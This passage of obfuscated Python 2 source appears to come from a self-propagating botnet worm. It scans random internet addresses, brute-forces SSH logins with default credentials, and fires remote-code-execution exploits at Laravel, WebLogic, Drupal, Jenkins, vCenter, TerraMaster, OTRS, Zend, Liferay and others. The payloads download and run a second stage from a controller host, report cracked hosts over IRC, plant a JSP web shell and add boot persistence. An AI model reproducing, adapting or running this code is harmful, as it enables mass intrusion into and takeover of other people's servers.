        ZvGKASSa=re.sub("", "=00", b64encode('<?php __HALT_COMPILER(); ?>\r\n\xd1\x02\x00\x00\x02\x00\x00\x00\x11\x00\x00\x00\x01\x00\x00\x00\x00\x00z\x02\x00\x00O:32:"Monolog\\Handler\\SyslogUdpHandler":1:{s:9:"\x00*\x00socket";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\x00*\x00fDFRByLyor";O:29:"Monolog\\Handler\\BufferHandler":7:{s:10:"\x00*\x00fDFRByLyor";N;s:13:"\x00*\x00bufferSize";i:-1;s:9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;s:11:FAGGOESHERE;s:5:"level";N;}}s:8:"\x00*\x00level";N;s:14:"\x00*\x00initialized";b:1;s:14:"\x00*\x00bufferLimit";i:-1;s:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}s:13:"\x00*\x00bufferSize";i:-1;s:9:"\x00*\x00buffer";a:1:{i:0;a:2:{i:0;s:11:FAGGOESHERE;s:5:"level";N;}}s:8:"\x00*\x00level";N;s:14:"\x00*\x00initialized";b:1;s:14:"\x00*\x00bufferLimit";i:-1;s:13:"\x00*\x00processors";a:2:{i:0;s:7:"current";i:1;s:6:"system";}}}\x05\x00\x00\x00dummy\x04\x00\x00\x00]\xcd\x00`\x04\x00\x00\x00\x0c~\x7f\xd8\xa4\x01\x00\x00\x00\x00\x00\x00\x08\x00\x00\x00test.txt\x04\x00\x00\x00]\xcd\x00`\x04\x00\x00\x00\x0c~\x7f\xd8\xa4\x01\x00\x00\x00\x00\x00\x00testtest\x1b\xbb\x95\xb7v\xb0:\xd8\xbd26\x05\xe7\xe7{;\xbcA\xb9(\x02\x00\x00\x00GBMB'.replace(FAGGOESHERE,WSSqEaoRMGzD.replace('/', '\/').replace('\'', '\\\''))))[3::].replace(==00, 3D=00)
        for i in range(MhniBhNK):
            ZvGKASSa += '=00'
        return ZvGKASSa
    def WNxaRZBhWo(self,url):
        GySDRknNVz=/var/www/html/laravel/storage/logs/laravel.log
        MhniBhNK=0
        qfdjdcYV=self.generate_fcEeSaeWx(MhniBhNK)
        url=url+/_ignition/execute-solution
        self.yiyoxzRfaRj(url, php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s%(GySDRknNVz))
        self.create_fcEeSaeWx(url, 'AA')
        self.create_fcEeSaeWx(url, qfdjdcYV)
        cvUhXUdo=0
        while (not self.aJKEkkLw(url, php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=%s%(GySDRknNVz))):
            cvUhXUdo += 1
            if cvUhXUdo > 9:
                break
            self.yiyoxzRfaRj(url, php://filter/write=convert.base64-decode|convert.base64-decode|convert.base64-decode/resource=%s%(GySDRknNVz))
            self.create_fcEeSaeWx(url, 'AA')
            MhniBhNK += 1
            ZvGKASSa=self.generate_fcEeSaeWx(MhniBhNK)
            self.create_fcEeSaeWx(url, ZvGKASSa)
        self.Qjzqqfjxhvl(url, phar://%s%(GySDRknNVz))
    def vvfiPNExMyih(self, ip, inEYahePcCAg):
        try:
            try:
                ssh = paramiko.SSHClient()
            except:
                import paramiko
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip,port=22,EzbaUkaocbpK=inEYahePcCAg.split(":")[0],IMOaNfYSHGDe=inEYahePcCAg.split(":")[1],allow_agent=False,look_for_keys=False,key_VdxcFozRoO=None,timeout=3)
            self.commSock.send(PRIVMSG %s :CRACKED - %s:%s
 % (self.AviaeEPO,ip,inEYahePcCAg))
            ssh.exec_command(WSSqEaoRMGzD)
            time.sleep(20)
            ssh.close()
            return 1
        except paramiko.ssh_exception.BadAuthenticationType:
            return 1
        except paramiko.ssh_exception.AuthenticationException:
           return 0
        except:
           return 1
    def kVljQimU(self, ip, cIhJxUIQN):
        global WMiBcGbzLiZ,WSSqEaoRMGzD,NabTnfhUghb,FAozAuHBacRN
        self.scanips.append(ip)
        if cIhJxUIQN == 22:
            if FAozAuHBacRN:
                xnAVoUShPJ = [
                    root:root,
                    admin:admin,
                    admin:1234,
                    root:toor,
                    root:admin,
                    root:12345678,
                    root:123456,
                    root:webadmin,
                    admin:webserver,
                    admin:12345678,
                    root:password,
                    root:12345678,
                    root:1234,
                    root:12345,
                    root:qwerty,
                    support:support,
                    student:student,
                    root:letmein,
                    admin:pfsense,
                    root:freenas,
                    root:test,
                    root:passwd,
                    debian:debian,
                    ftpuser:steriskftp,
                    root:sonicwall,
                    usuario:usuario,
                    admin:superuser,
                    admin:admin123,
                    root:blackarch,
                    root:default,
                    root:toor,
                    root:letmein,
                    user:password,
                    user:user,
                    guest:guest,
                    ftp:ftp,
                    irc:irc,
                    ircd:ircd,
                    apache:apache,
                    tomcat:tomcat,
                    oracle:oracle,
                    mysql:mysql,
                    postgresql:postgresql,
                    postgres:postgres,
                    postfix:postfix,
                    root:server,
                    root:ubuntu,
                    ubuntu:ububtu,
                    root:debian,
                    root:alpine,
                    root:ceadmin,
                    root:indigo,
                    root:linux,
                    root:rootpasswd,
                    root:timeserver,
                    root:webadmin,
                    root:webmaster,
                    root:Passw@rd,
                    pi:raspberry,
                    root:alpine
                ]
                for inEYahePcCAg in xnAVoUShPJ:
                    if self.vvfiPNExMyih(ip, inEYahePcCAg):
                        return self.scanips.remove(ip)
                for zuGIHbaDfz in [3,4,5]:
                    for inEYahePcCAg in itertools.permutations(0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@$,zuGIHbaDfz):
                        qUNHkQawX="".join(inEYahePcCAg)
                        if self.vvfiPNExMyih(ip, root:+qUNHkQawX):
                            return self.scanips.remove(ip)
                        if self.vvfiPNExMyih(ip, admin:+qUNHkQawX):
                            return self.scanips.remove(ip)
                        if self.vvfiPNExMyih(ip, user:+qUNHkQawX):
                            return self.scanips.remove(ip)
        if "443" in str(cIhJxUIQN):
            url = https://+ip+":"+str(cIhJxUIQN)
        else:
            url = http://+ip+":"+str(cIhJxUIQN)
        PcAaSXjNzdn = random.choice(self.GbASkEbE)
        if cIhJxUIQN == 7001:
            try:
                if WebLogic Server Administration Console Home in urllib2.urlopen(urllib2.Request(url+/console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal?_nfpb=true&_pageLabel=HomePage1&handle=java.lang.String("ahihi"), headers={User-Agent : PcAaSXjNzdn})).read():
                    cgGqSAOoOAdn="_nfpb=false&_pageLabel=HomePage1&fDFRByLyo=com.tangosol.coherence.mvel2.sh.ShellSession(\"weblogic.work.ExecuteThread executeThread=(weblogic.work.ExecuteThread)Thread.currentThread();\r\nweblogic.work.WorkAdapter adapter = executeThread.getCurrentWork();\r\njava.lang.reflect.Field field = adapter.getClass().getDeclaredField(\"connectionHandler\");\r\nfield.setAccessible(true);\r\nObject obj = field.get(adapter);\r\nweblogic.servlet.internal.ServletRequestImpl req = (weblogic.servlet.internal.ServletRequestImpl) obj.getClass().getMethod(\"getServletRequest\").invoke(obj);\r\nString cmd = req.getHeader(\"cmd\");\r\nString[] cmds = System.getProperty(\"os.name\").toLowerCase().contains(\"window\") ? new String[]{\"cmd.exe\",\"/c\", cmd} : new String[]{\"/bin/sh\",\"-c\", cmd};\r\nif (cmd != null) {\r\n    String sewUmxUDTH = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(\"\\\\\\A\").next();\r\n    weblogic.servlet.internal.ServletResponseImpl res=(weblogic.servlet.internal.ServletResponseImpl)req.getClass().getMethod(\"getResponse\").invoke(req);\r\n    res.getServletOutputStream().writeStream(new weblogic.xml .util.StringInputStream(sewUmxUDTH));\r\n    res.getServletOutputStream().flush();\r\n    res.getWriter().write(\"\");}executeThread.interrupt();\");"
                    for cmd in [WSSqEaoRMGzD, NabTnfhUghb]:
                        XiohhxiZx = {
                            'cmd': cmd,
                            Content-Type:application/x-www-form-urlencoded,
                            User-Agent:PcAaSXjNzdn, 
                            Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,
                            Connection:close,
                            Accept-Encoding:gzip,deflate,
                            Content-Type:application/x-www-form-urlencoded
                        }
                        try:
                            urllib2.urlopen(urllib2.Request(url+/console/framework/skins/wlsconsole/images/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fconsole.portal, data=cgGqSAOoOAdn, headers={XiohhxiZx}))
                        except:
                            pass
            except:
                pass
        try:
            aATEcdqyo=urllib2.urlopen(urllib2.Request(url+"/", headers={User-Agent}), context=self.ctx)
            if TNAS in aATEcdqyo.get(Sever) or TerraMaster in aATEcdqyo.get(X-Powered-By):
                try:
                    urllib2.urlopen(urllib2.Request(url+/include/exportUser.php?type=3&cla=application&func=_exec&opt=php%20-r%20%22file_put_contents%28%5C%22setup%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup%20-O%3Bcurl%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22setup.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup%20-O%20setup%3Bwget%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup.py%20-O%20setup.py%3Bchmod%20777%20setup.py%3Bchmod%20777%20setup%3Bpython2%20setup.py%7C%7Cpython2.7%20setup.py%7C%7Cpython%20setup.py%7C%7C.%2Fsetup.py%7C%7C.%2Fsetup, "", headers={User-Agent : PcAaSXjNzdn}))
                except:
                    pass
                try:
                    urllib2.urlopen(urllib2.Request(url+/include/makecvs.php?Event=%60php%20-r%20%22file_put_contents%28%5C%22setup%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup%20-O%3Bcurl%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22setup.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup%20-O%20setup%3Bwget%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup.py%20-O%20setup.py%3Bchmod%20777%20setup.py%3Bchmod%20777%20setup%3Bpython2%20setup.py%7C%7Cpython2.7%20setup.py%7C%7Cpython%20setup.py%7C%7C.%2Fsetup.py%7C%7C.%2Fsetup%60, "", headers={User-Agent : PcAaSXjNzdn}), context=self.ctx)
                except:
                    pass
            if X-Drupal-Cache in aATEcdqyo:
                FuwkoyFEwm = echo ---- &  + WSSqEaoRMGzD
                RlbwiRaJw = { link: [ { value: link, options: "O:24:\"GuzzleHttp\\Psr7\\FnStream\":2:{s:33:\"\u0000" "GuzzleHttp\\Psr7\\FnStream\u0000methods\";a:1:{s:5:\"" "close\";a:2:{i:0;O:23:\"GuzzleHttp\\HandlerStack\":3:" "{s:32:\"\u0000GuzzleHttp\\HandlerStack\u0000fDFRByLyor\";" "s:|size|:\"|command|\";s:30:\"\u0000GuzzleHttp\\HandlerStack\u0000" "stack\";a:1:{i:0;a:1:{i:0;s:6:\"system\";}}s:31:\"\u0000" "GuzzleHttp\\HandlerStack\u0000cached\";b:0;}i:1;s:7:\"" "LqPlIncxe\";}}s:9:\"_fn_close\";a:2:{i:0;r:4;i:1;s:7:\"LqPlIncxe\";}}" "".replace(|size|, str(len(FuwkoyFEwm))).replace(|command|, FuwkoyFEwm) } ], _links: { type: { href: url + /rest/type/shortcut/default } } }
                try:
                    if "HIT" not in urllib2.urlopen(urllib2.Request(url + /node/ + str(node_id) + ?_format=hal_json, json.dumps(RlbwiRaJw), headers={Content-Type : application/hal+json}), context=self.ctx).headers.get(X-Drupal-Cache):
                            self.commSock.send(PRIVMSG %s :DRUPAL - %s % (self.AviaeEPO, url))
                except:
                    pass
                try:
                    hPqScdhVd=b64encode(passthru(' + WSSqEaoRMGzD + "');")
                    try:
                        SogGBfhifmd={
                            form_id :   
                            user_pass,
                          _triggering_element_name : name
                        }
                        urllib2.urlopen(urllib2.Request(url+/?q=user/password&name%5b%23post_render%5d%5b%5d=assert&name%5b%23markup%5d=eval%28base64_decode%28%29%22+hPqScdhVd +%22%29%3b&name%5b%23type%5d=markup, urllib.urlencode(SogGBfhifmd), headers={User-Agent : PcAaSXjNzdn}), context=self.ctx)
                    except:
                        pass
                except:
                    pass
            if Jenkins in aATEcdqyo.get(X-Powered-By):
                try:
                    urllib2.urlopen(urllib2.Request(url + /descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript/, sandbox=True&value=class abcd{abcd(){' + WSSqEaoRMGzD + '.execute()}}, headers={User-Agent : PcAaSXjNzdn, Authorization-Basic : b64encode(jenkins:jenkins)}), context=self.ctx)
                except:
                    pass
            else:
                self.WNxaRZBhWo(url)
        except:
            pass
        giDUenOqwomv=self.enYhURMomcJY(8)
        try:
            udOmFxcIoncn={
                page : bylistbox,
                host_list : 127.0.0.1,
                tool_list : /proc/self/environ,
                snmp_com : "aze",
                snmp_version : "2c",
                min_port : "1",
                max_port : 1024,
                username : "",
                password : "",
                snmp_auth_protocol : "MD5",
                snmp_priv_passphrase : "",
                snmp_priv_protocol : "",
                snmp_context : ""
            }
            urllib2.urlopen(urllib2.Request(url+/module/tool_all/select_tool.php&+giDUenOqwomv+"="+hPqScdhVd, urllib.urlencode(udOmFxcIoncn), headers={User-Agent : <?php eval(base64_decode($_GET[+giDUenOqwomv+])); ?>}), context=self.ctx)
        except:
            pass
        try:
            cEVUZkuJGodW=self.enYhURMomcJY(random.randint(4,8))
            urllib2.urlopen(urllib2.Request(url+/auth/requestreset&+giDUenOqwomv+"="+hPqScdhVd, "{"+'"'+auth+'"'+":{"+'"'+user+'"'+": "+'"'+""+cEVUZkuJGodW+'.eval(base64_decode($_GET[+giDUenOqwomv +])).'+'"'+"}}",headers={Content-Type: application/json; charset=UTF-8, User-Agent :  PcAaSXjNzdn, Orgin: url}), context=self.ctx)
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url+/gila/?c=admin, headers={User-Agent: <?php eval(base64_decode("+hPqScdhVd+")); include "src\core\bootstrap.php"; ?>, Cookie: GSESSIONID=../../index.php}), context=self.ctx)
            urllib2.urlopen(urllib2.Request(url+/gila/index.php, headers={User-Agent :  PcAaSXjNzdn}), context=self.ctx)
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url+/actions/authenticate.php, urllib.urlencode({user: test+'"'+'&'+self.rcecommand, pswd: test}), headers={Content-Type: application/json, User-Agent :  PcAaSXjNzdn}), context=self.ctx)
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url+/edit/server/, token=149e2b8c201fd88654df6fd694158577&save=save&v_hostname=1338.example.com&v_timezone=Europe%2FIstanbul&v_language=en&v_mail_url=&v_mail_ssl_domain=&v_mysql_url=&v_mysql_password=&v_backup=yes&v_backup_gzip=5&v_backup_dir=%2Fbackup&v_backup_type=ftp&v_backup_host=&v_backup_username=&v_backup_password=&v_backup_bpath=&v_web_ssl_domain=&v_sys_ssl_crt=privatekeyblablabla&v_quota=no&v_firewall=no&v_sftp=yes&v_sftp_licence=1%20%60php%20-r%20%22file_put_contents%28%5C%22setup%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup%5C%22%29%29%3B%22%3Bcurl%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup%20-O%3Bcurl%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup.py%20-O%3Bphp%20-r%20%22file_put_contents%28%5C%22setup.py%5C%22%2C%20file_get_contents%28%5C%22http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup.py%5C%22%29%29%3B%22%3Bwget%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup%20-O%20setup%3Bwget%20http%3A%2F%2F + WMiBcGbzLiZ + %2Fsetup.py%20-O%20setup.py%3Bchmod%20777%20setup.py%3Bchmod%20777%20setup%3Bpython2%20setup.py%7C%7Cpython2.7%20setup.py%7C%7Cpython%20setup.py%7C%7C.%2Fsetup.py%7C%7C.%2Fsetup%60&v_filemanager=no&v_filemanager_licence=&v_softaculous=yes&save=Save, headers={User-Agent : PcAaSXjNzdn}), context=self.ctx)
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url + /cgi-bin/slogin/login.py,"",headers={User-Agent : () { :; }; echo ; echo ; /bin/sh -c  + WSSqEaoRMGzD +  ' bash -s :'}))
        except:
            pass
        try:
            urllib2.urlopen(urllib2.Request(url+/ui/vropspluginui/rest/services/uploadova,"",headers={User-Agent : PcAaSXjNzdn}),context=self.ctx)
        except urllib2.HTTPError as e:
            if e.code == 405:
                QmliXczkdVxM=(os.getenv(TEMP) if os.name=="nt" else /tmp)+os.path.sep
                x=open(QmliXczkdVxM+3.jsp,"w")
                x.write(3c2540207061676520696d706f72743d276a6176612e696f2e52756e74696d652720253e3c25207472797b52756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d6574657228227461722229293b636174636828494f457863657074696f6e2065297b7d20253e.decode("HEX"))
                x.close()
                tarf=tarfile.open(QmliXczkdVxM+1.tar,'w')
                oSifpXuzVmcQ=".."+"\\"
                ahQVpbUalbJ=oSifpXuzVmcQ*5+"ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\upload.jsp"
                tarf.add(QmliXczkdVxM+3.jsp,ahQVpbUalbJ.replace('/','\\').replace(\\,'\\'))
                tarf.close()
                tarf=tarfile.open(QmliXczkdVxM+2.tar,'w')
                oSifpXuzVmcQ=".."+"/"
                ahQVpbUalbJ=oSifpXuzVmcQ*5+/var/www/html/upload.jsp
                tarf.add(QmliXczkdVxM+3.jsp,ahQVpbUalbJ.replace('\\','/').replace('//','/'))
                tarf.close()
                for x in [1,2]:
                    try:
                        PUPmoYodpQ=os.urandom(16).encode('hex')
                        f=open(QmliXczkdVxM+str(x)+.tar)
                        body="--%s\r\nContent-Disposition: form-data; name=\"uploadFile\"; VdxcFozRoO=\"upload.tar\"\r\n\r\n%s\r\n--%s--\r\n" % (PUPmoYodpQ,f.read(),PUPmoYodpQ)
                        f.close()
                        urllib2.urlopen(urllib2.Request(url+/ui/vropspluginui/rest/services/uploadova,body,headers={User-Agent : PcAaSXjNzdn,Content-Type : multipart/form-data; boundary=+PUPmoYodpQ,Accept-Encoding : gzip,deflate}),context=self.ctx)
                    except:
                        pass
                    try:
                        if x == 1:
                           urllib2.urlopen(urllib2.Request(url+/upload.jsp?tar=+cmd /C +NabTnfhUghb,headers={User-Agent : PcAaSXjNzdn}),context=self.ctx)
                        else:
                           urllib2.urlopen(urllib2.Request(url+/upload.jsp?tar=+WSSqEaoRMGzD,headers={User-Agent : PcAaSXjNzdn}),context=self.ctx)
                    except:
                         pass
        except:
            pass
        try:
            try:
                EzbaUkaocbpK = root@localhost
                IMOaNfYSHGDe = root
                XooHZcGNhLh = urllib2.urlopen(urllib2.Request(url, {Action:Login,RequestedURL:"",Lang:"en",TimeOffset:-480,User:EzbaUkaocbpK,Password:IMOaNfYSHGDe}, headers={User-Agent : PcAaSXjNzdn}), context=self.ctx).headers.get(Set-Cookie)
                if OTRSAgentInterface not in XooHZcGNhLh:
                    return
                mVbangSY = urllib2.urlopen(urllib2.Request(url+/?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework, "", headers={User-Agent : PcAaSXjNzdn, Cookie : XooHZcGNhLh}), context=self.ctx).read()
                ohGcbCfL = mVbangSY.find(<input type="hidden" name="ChallengeToken" value=")+50;
                olpacbpZDi = mVbangSY[ohGcbCfL:ohGcbCfL+32];
                kapFZzTlDT = {ChallengeToken:olpacbpZDi,Action:AdminSysConfig,Subaction:Update,SysConfigGroup:Framework,SysConfigSubGroup:Crypt::PGP,DontWriteDefault:"1","PGP":"1",PGP::Bin:/bin/sh,PGP::Options:-c '+WSSqEaoRMGzD+"'",PGP::Key::PasswordKey[]:488A0B8F,PGP::Key::PasswordContent[]:SomePassword,PGP::Key::PasswordDeleteNumber[]:"1",PGP::Key::PasswordKey[]:D2DF79FA,PGP::Key::PasswordContent[]:SomePassword,PGP::Key::PasswordDeleteNumber[]:"2",PGP::TrustedNetworkItemActive:"1",PGP::TrustedNetwork:"0",PGP::LogKey[]:BADSIG,PGP::LogContent[]:The+PGP+signature+with+the+keyid+has+not+been+verified+successfully.,PGP::LogDeleteNumber[]:"1",PGP::LogKey[]:ERRSIG,PGP::LogContent[]:It+was+not+possible+to+check+the+PGP+signature%2C+this+may+be+caused+by+a+missing+public+key+or+an+unsupported+algorithm.,PGP::LogDeleteNumber[]:"2",PGP::LogKey[]:EXPKEYSIG,PGP::LogContent[]:The+PGP+signature+was+made+by+an+expired+key.,PGP::LogDeleteNumber[]:"3",PGP::LogKey[]:GOODSIG,PGP::LogContent[]:Good+PGP+signature.,PGP::LogDeleteNumber[]:"4",PGP::LogKey[]:KEYREVOKED,PGP::LogContent[]:The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.,PGP::LogDeleteNumber[]:"5",PGP::LogKey[]:NODATA,PGP::LogContent[]:No+valid+OpenPGP+data+found.,PGP::LogDeleteNumber[]:"6",PGP::LogKey[]:NO_PUBKEY,PGP::LogContent[]:No+public+key+found.,PGP::LogDeleteNumber[]:"7",PGP::LogKey[]:REVKEYSIG,PGP::LogContent[]:The+PGP+signature+was+made+by+a+revoked+key%2C+this+could+mean+that+the+signature+is+forged.,PGP::LogDeleteNumber[]:"8",PGP::LogKey[]:SIGEXPIRED,PGP::LogContent[]:The+PGP+signature+is+expired.,PGP::LogDeleteNumber[]:"9",PGP::LogKey[]:SIG_ID,PGP::LogContent[]:Signature+data.,PGP::LogDeleteNumber[]:"10",PGP::LogKey[]:TRUST_UNDEFINED,PGP::LogContent[]:This+key+is+not+certified+with+a+trusted+signature%21.,PGP::LogDeleteNumber[]:"11",PGP::LogKey[]:VALIDSIG,PGP::LogContent[]:The+PGP+signature+with+the+keyid+is+good.,PGP::LogDeleteNumber[]:"12",PGP::StoreDecryptedData:"1"}
                urllib.urlopen(urllib2.Request(url+/?Action=AdminSysConfig;Subaction=Edit;SysConfigSubGroup=Crypt::PGP;SysConfigGroup=Framework, data=kapFZzTlDT, headers={User-Agent : PcAaSXjNzdn, Cookie : XooHZcGNhLh}), context=self.ctx)
                urllib.urlopen(urllib2.Request(url+/?Action=AdminPGP,"", headers={User-Agent : PcAaSXjNzdn, Cookie : XooHZcGNhLh}), self.ctx)
            except:
                pass
            out = StringIO()
            with gzip.GzipFile(fileobj=out, mode="w") as f:
                f.write('O:25:"Zend\\Http\\Response\\Stream":2:{s:10:"\0*\0cleanup";b:1;s:13:"\0*\0streamName";O:25:"Zend\\View\\Helper\\Gravatar":2:{s:7:"\0*\0view";O:30:"Zend\\View\\Renderer\\PhpRenderer":1:{s:41:"\0Zend\\View\\Renderer\\PhpRenderer\0__helpers";O:31:"Zend\\Config\\ReaderPluginManager":2:{s:11:"\0*\0services";a:2:{s:10:"escapehtml";O:23:"Zend\\Validator\\Callback":1:{s:10:"\0*\0options";a:2:{s:8:"callback";s:6:"system";s:15:"callbackOptions";a:1:{i:0;s:959:"echo ' + b64encode(WSSqEaoRMGzD) + '|base64 -d|sh";}}}s:14:"escapehtmlattr";r:7;}s:13:"\0*\0instanceOf";s:23:"Zend\\Validator\\Callback";}}s:13:"\0*\0attributes";a:1:{i:1;s:1:"a";}}}')
            WVepJCMilMuO = {
                hello : b64encode(out.getvalue())
            }
            out = StringIO()
            with gzip.GzipFile(fileobj=out, mode="w") as f:
                f.write('O:25:"Zend\\Http\\Response\\Stream":2:{s:10:"\0*\0cleanup";b:1;s:13:"\0*\0streamName";O:25:"Zend\\View\\Helper\\Gravatar":2:{s:7:"\0*\0view";O:30:"Zend\\View\\Renderer\\PhpRenderer":1:{s:41:"\0Zend\\View\\Renderer\\PhpRenderer\0__helpers";O:31:"Zend\\Config\\ReaderPluginManager":2:{s:11:"\0*\0services";a:2:{s:10:"escapehtml";O:23:"Zend\\Validator\\Callback":1:{s:10:"\0*\0options";a:2:{s:8:"callback";s:6:"system";s:15:"callbackOptions";a:1:{i:0;s:959:"powershell Invoke-Expression ' + b64encode((New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/py.exe','python.exe');(New-Object System.Net.WebClient).DownloadFile('http://DOMAIN/setup.py','setup.py');.replace(DOMAIN, WMiBcGbzLiZ)) + ' &.\python.exe setup.py";}}}s:14:"escapehtmlattr";r:7;}s:13:"\0*\0instanceOf";s:23:"Zend\\Validator\\Callback";}}s:13:"\0*\0attributes";a:1:{i:1;s:1:"a";}}}')
            wJNpoWbYi = {
                hello : b64encode(out.getvalue())
            }
            try:
                urllib2.urlopen(urllib2.Request(url+/zend3/public/, urllib.urlencode(WVepJCMilMuO), headers={Content-Type: application/json, User-Agent : PcAaSXjNzdn}), context=self.ctx)
            except:
                pass
            try:
                urllib2.urlopen(urllib2.Request(url+/zend3/public/, urllib.urlencode(wJNpoWbYi), headers={Content-Type: application/json, User-Agent : PcAaSXjNzdn}), context=self.ctx)
            except:
                pass
            try:
                urllib2.urlopen(urllib2.Request(url+/api/jsonws/expandocolumn/update-column, data=urllib.urlencode({columnId: '1', name: '2', type: '3', +defaultData: com.mchange.v2.c3p0.WrapperConnectionPoolDataSource,defaultData.userOverridesAsString: HexAsciiSerializedMap:aced00057372003d636f6d2e6d6368616e67652e76322e6e616d696e672e5265666572656e6365496e6469726563746f72245265666572656e636553657269616c697a6564621985d0d12ac2130200044c000b636f6e746578744e616d657400134c6a617661782f6e616d696e672f4e616d653b4c0003656e767400154c6a6176612f7574696c2f486173687461626c653b4c00046e616d6571007e00014c00097265666572656e63657400184c6a617661782f6e616d696e672f5265666572656e63653b7870707070737200166a617661782e6e616d696e672e5265666572656e6365e8c69ea2a8e98d090200044c000561646472737400124c6a6176612f7574696c2f566563746f723b4c000c636c617373466163746f72797400124c6a6176612f6c616e672f537472696e673b4c0014636c617373466163746f72794c6f636174696f6e71007e00074c0009636c6173734e616d6571007e00077870737200106a6176612e7574696c2e566563746f72d9977d5b803baf010300034900116361706163697479496e6372656d656e7449000c656c656d656e74436f756e745b000b656c656d656e74446174617400135b4c6a6176612f6c616e672f4f626a6563743b78700000000000000000757200135b4c6a6176612e6c616e672e4f626a6563743b90ce589f1073296c02000078700000000a707070707070707070707874000a4576696c4f626a656374740049687474703a2f2f+WMiBcGbzLiZ+2f740003466f6f;}), headers={Content-Type: application/json, Authorization : Basic dGVzdEBsaWZlcmF5LmNvbTp0ZXN0,User-Agent : PcAaSXjNzdn}), context=self.ctx)
            except:
                pass
        except:
            pass
        try:
            self.scanips.remove(ip)
        except:
            pass
    def ZSbcqBWQKw(self):
        cxiboXLaFZA = [10,127,169,172,192,233,234]
        bDMLYokf = random.randrange(1,256)
        while bDMLYokf in cxiboXLaFZA:
            bDMLYokf = random.randrange(1,256)
        ip = ".".join([str(bDMLYokf),str(random.randrange(1,256)),
        str(random.randrange(1,256)),str(random.randrange(1,256))])
        return ip
    def aCpPbwVJEEfT(self):
        global FAozAuHBacRN,ports
        while True:
            while self.scannerenabled==0:
                time.sleep(1)
            VpVUYxUocNoJ = self.ZSbcqBWQKw()
            for YukdTXMlxO in ports:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(0.37)
                    s.connect((VpVUYxUocNoJ, YukdTXMlxO))
                    s.close()
                    self.kVljQimU(VpVUYxUocNoJ, YukdTXMlxO)
                except:
                    pass
    def yuGZRsNJbFiW(self):
        if os.name == 'nt':
            try:
                aReg = ConnectRegistry(None,HKEY_CURRENT_USER)
                aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run")
                aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
                SetValueEx(aKey,System explore,0, REG_SZ, os.getenv(USERPROFILE) + \$6829.exe  + os.path.r)
                windll.kernel32.SetFileAttributesW(os.getenv(USERPROFILE) + \$6829.exe, FILE_ATTRIBUTE_HIDDEN)
            except:
                pass
            return
        else:
            try:
                LqPlIncx=open(/etc/resolv.conf, "w")
                LqPlIncx.write(nameserver 1.1.1.1
nameserver 1.0.0.1
)
                LqPlIncx.close()
                rc=open(/etc/rc.local,"rb")
                data=rc.read()
                rc.close()
                if setup.py not in data:
                    with open(EFCTiLDlTRA, 'rb') as SBiAXHHmMav, open(/etc/setup.py, 'wb') as coGWMSaybM:
                        while True:
                            oaTigyLKFSH = SBiAXHHmMav.read(1024*1024)
                            if not oaTigyLKFSH:
                                break
                            coGWMSaybM.write(oaTigyLKFSH)
                    os.chmod(/etc/boot, 777)
                    rc=open(/etc/rc.local,"wb")
                    if exit in data:
